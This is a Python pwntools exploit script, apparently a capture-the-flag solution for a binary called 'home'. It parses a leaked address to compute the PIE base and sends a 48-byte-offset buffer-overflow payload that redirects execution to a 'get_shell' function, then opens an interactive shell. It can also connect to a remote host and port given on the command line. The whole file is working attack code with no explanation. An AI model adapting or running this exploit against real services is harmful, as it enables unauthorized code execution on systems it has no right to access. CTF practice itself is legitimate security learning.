from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './home'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
filterwarnings("ignore")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================



# Start program
io = start()

io.recvuntil('is:')
leak = io.recvline().split()
elf.address = int(leak[0], 16) - elf.sym['home']

offset = 48
payload = flat({
    offset: [
        elf.sym['get_shell']
    ]
})

io.sendline(payload)
io.interactive()
